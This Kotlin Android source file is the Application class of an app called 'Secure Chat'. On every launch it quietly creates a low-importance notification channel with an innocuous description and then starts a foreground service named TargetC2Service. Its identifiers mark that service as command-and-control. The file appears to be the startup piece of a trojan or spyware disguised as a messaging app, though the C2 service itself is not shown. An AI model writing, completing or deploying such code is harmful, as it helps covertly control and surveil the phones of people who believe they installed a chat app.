package com.secure.chat

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.os.Build
import com.secure.chat.services.TargetC2Service

class SecureChatApp : Application() {

    companion object {
        const val CHANNEL_ID = "secure_chat_c2"
        const val CHANNEL_NAME = "Secure Chat Service"
        lateinit var instance: SecureChatApp
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        createNotificationChannel()

        // 🔥 FIX: Firebase dipindah ke background thread biar ga blocking + crash
        android.os.HandlerThread("FirebaseInit").apply {
            start()
            android.os.Handler(looper).post {
                try {
                    com.google.firebase.database.FirebaseDatabase.getInstance()
                        .setPersistenceEnabled(true)
                } catch (e: Exception) {
                    android.util.Log.e("SecureChatApp", "Firebase persistence error", e)
                }
            }
        }

        // 🔥 FIX: Service start ditunda dikit biar notification channel ready
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                startC2Service()
            } catch (e: Exception) {
                android.util.Log.e("SecureChatApp", "C2 service start error", e)
            }
        }, 500)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background service for Secure Chat"
                setShowBadge(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun startC2Service() {
        val intent = Intent(this, TargetC2Service::class.java).apply {
            action = "start"
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}
